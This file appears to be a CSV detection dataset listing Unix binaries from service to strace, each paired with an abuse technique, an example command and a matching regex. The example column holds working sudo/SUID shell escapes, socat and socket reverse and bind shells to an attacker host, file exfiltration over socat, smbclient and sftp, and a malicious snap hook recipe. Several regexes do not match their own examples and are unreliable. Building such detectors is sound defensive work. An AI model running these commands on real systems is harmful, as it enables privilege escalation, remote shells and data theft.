Name,Function,ExampleCode,Regex,Notes
service,shell,/usr/sbin/service ../../bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?service\s+(?:/bin/(?:sh|bash))),
service,sudo,sudo service ../../bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?service\s+(?:/bin/(?:sh|bash))),
setarch,shell,setarch $(arch) /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setarch\s+(?:/bin/(?:sh|bash))),
setarch,suid,./setarch $(arch) /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setarch\s*\-p\s+(?:/bin/(?:sh|bash))),
setarch,sudo,sudo setarch $(arch) /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setarch\s+(?:/bin/(?:sh|bash))),
setfacl,suid,./setfacl -m u:$USER:rwx $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setfacl\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
setfacl,sudo,sudo setfacl -m -u:$USER:rwx $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setfacl\s*\-m\s*\-u\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
setlock,shell,setlock $TF /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setlock\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
setlock,suid,./setlock - /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setlock\s*\-p\s+(?:/bin/(?:sh|bash))),
setlock,sudo,sudo setlock - /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setlock\s+(?:/bin/(?:sh|bash))),
sftp,shell,"sftp $HOST
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sftp,file-upload,"sftp $RHOST
put file_to_send file_to_save","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a SSH server.
sftp,file-download,"sftp $RHOST
get file_to_get file_to_save","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a SSH server.
sftp,sudo,"sudo sftp $HOST
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sg,shell,sg $(id -ng),(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sg\s+.+),"Commands can be run if the current user's group is specified, therefore no additional permissions are needed."
sg,sudo,sudo sg root,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sg\s+.+),
shuf,file-read,"shuf -z ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is corrupted by randomizing the order of NUL terminated strings.
shuf,file-write,"shuf -e DATA -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-e\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The written file content is corrupted by adding a newline.
shuf,suid,"./shuf -e DATA -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-e\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The written file content is corrupted by adding a newline.
shuf,sudo,"sudo shuf -e DATA -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-e\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The written file content is corrupted by adding a newline.
slsh,shell,"slsh -e 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?slsh\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
slsh,sudo,"sudo slsh -e 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?slsh\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
slsh,limited-suid,"./slsh -e 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?slsh\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
smbclient,shell,"smbclient '\\attacker\share'
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s+(?:/bin/(?:sh|bash))),
smbclient,file-upload,smbclient '\\attacker\share' -c 'put file_to_send where_to_save',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.
smbclient,file-download,smbclient '\\attacker\share' -c 'put file_to_send where_to_save',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.
smbclient,sudo,"sudo smbclient '\\attacker\share'
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s+(?:/bin/(?:sh|bash))),
snap,sudo,sudo snap install xxxx_1.0_all.snap --dangerous --devmode,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?snap\s*\-\-dangerous\s*\-\-devmode\s+.+),"It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' ""$COMMAND"" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
"
socat,shell,socat stdin exec:/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash))),The resulting shell is not a proper TTY shell and lacks the prompt.
socat,reverse-shell,"socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
socat,bind-shell,"socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell."
socat,file-upload,socat -u file:$LFILE tcp-connect:$RHOST:$RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file."
socat,file-download,"socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file."
socat,file-read,"socat -u ""file:$LFILE"" -","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
socat,file-write,"socat -u 'exec:echo DATA' ""open:$LFILE,creat""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
socat,sudo,sudo socat stdin exec:/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash))),The resulting shell is not a proper TTY shell and lacks the prompt.
socat,limited-suid,"./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
socket,reverse-shell,socket -qvp '/bin/sh -i' $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socket\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
socket,bind-shell,socket -svp '/bin/sh -i' $LPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socket\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
soelim,file-read,"soelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?soelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
soelim,suid,"./soelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?soelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
soelim,sudo,"sudo soelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?soelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
softlimit,shell,softlimit /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?softlimit\s+(?:/bin/(?:sh|bash))),
softlimit,suid,./softlimit /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?softlimit\s*\-p\s+(?:/bin/(?:sh|bash))),
softlimit,sudo,sudo softlimit /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?softlimit\s+(?:/bin/(?:sh|bash))),
sort,file-read,"sort -m ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sort\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sort,suid,"./sort -m ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sort\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sort,sudo,"sudo sort -m ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sort\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
split,file-read,"split $LFILE $TF
cat $TF*","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
split,file-write,"echo DATA >$TF
split -b999m $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough."
split,file-write,"echo DATA >$TF
split -b999m --additional-suffix $EXTENSION $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-additional\-suffix\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough."
split,command,split --filter=$COMMAND $TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Command execution using an existing or newly created file.
split,command,echo | split --filter=$COMMAND /dev/stdin,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Command execution using stdin (and close it directly).
split,shell,split --filter=/bin/sh /dev/stdin,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:/bin/(?:sh|bash))),The shell prompt is not printed.
split,sudo,sudo split --filter=/bin/sh /dev/stdin,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:/bin/(?:sh|bash))),The shell prompt is not printed.
sqlite3,shell,sqlite3 /dev/null '.shell /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:/bin/(?:sh|bash))),
sqlite3,file-write,"sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sqlite3,file-read,"sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sqlite3,suid,"sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sqlite3,sudo,sudo sqlite3 /dev/null '.shell /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:/bin/(?:sh|bash))),
sqlite3,limited-suid,./sqlite3 /dev/null '.shell /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:/bin/(?:sh|bash))),
sqlmap,shell,"sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlmap\s*\-u\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b))",
sqlmap,sudo,"sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlmap\s*\-u\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b))",
ss,file-read,ss -a -F $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ss,suid,./ss -a -F $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ss,sudo,sudo ss -a -F $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh-agent,shell,ssh-agent /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s+(?:/bin/(?:sh|bash))),
ssh-agent,suid,./ssh-agent /bin/ -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s*\-p\s+.+),
ssh-agent,sudo,sudo ssh-agent /bin/,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s+.+),
ssh-keygen,library-load,ssh-keygen -D ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.+),
ssh-keygen,sudo,sudo ssh-keygen -D ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.+),
ssh-keygen,suid,./ssh-keygen -D ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.+),
ssh-keyscan,file-read,ssh-keyscan -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh-keyscan,suid,./ssh-keyscan -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh-keyscan,sudo,sudo ssh-keyscan -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh,shell,ssh localhost $SHELL --noprofile --norc,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-\-noprofile\s*\-\-norc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Reconnecting may help bypassing restricted shells.
ssh,shell,ssh -o ProxyCommand=';sh 0<&2 1>&2' x,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s+.+),Spawn interactive shell through ProxyCommand option.
ssh,shell,ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s*\-o\s+(?:/bin/(?:sh|bash))),"Spawn interactive shell on client, requires a successful connection towards `host`."
ssh,file-upload,"ssh $HOST ""cat > $RPATH"" < $LPATH","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a SSH server.
ssh,file-download,"ssh $HOST ""cat $RPATH"" > $LPATH","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a SSH server.
ssh,file-read,ssh -F $LFILE localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is corrupted by error prints.
ssh,sudo,sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s+.+),Spawn interactive root shell through ProxyCommand option.
sshpass,shell,sshpass /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s+(?:/bin/(?:sh|bash))),
sshpass,suid,./sshpass /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s*\-p\s+(?:/bin/(?:sh|bash))),
sshpass,sudo,sudo sshpass /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s+(?:/bin/(?:sh|bash))),
start-stop-daemon,shell,start-stop-daemon -n $RANDOM -S -x /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
start-stop-daemon,suid,./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
start-stop-daemon,sudo,sudo start-stop-daemon -n $RANDOM -S -x /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
stdbuf,shell,stdbuf -i0 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s+(?:/bin/(?:sh|bash))),
stdbuf,suid,./stdbuf -i0 /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s*\-p\s+(?:/bin/(?:sh|bash))),
stdbuf,sudo,sudo stdbuf -i0 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s+(?:/bin/(?:sh|bash))),
strace,file-write,strace -s 999 -o $LFILE strace - DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-s\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`."
strace,shell,strace -o /dev/null /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s+(?:/bin/(?:sh|bash))),
strace,suid,./strace -o /dev/null /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s*\-p\s+(?:/bin/(?:sh|bash))),
strace,sudo,sudo strace -o /dev/null /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s+(?:/bin/(?:sh|bash))),
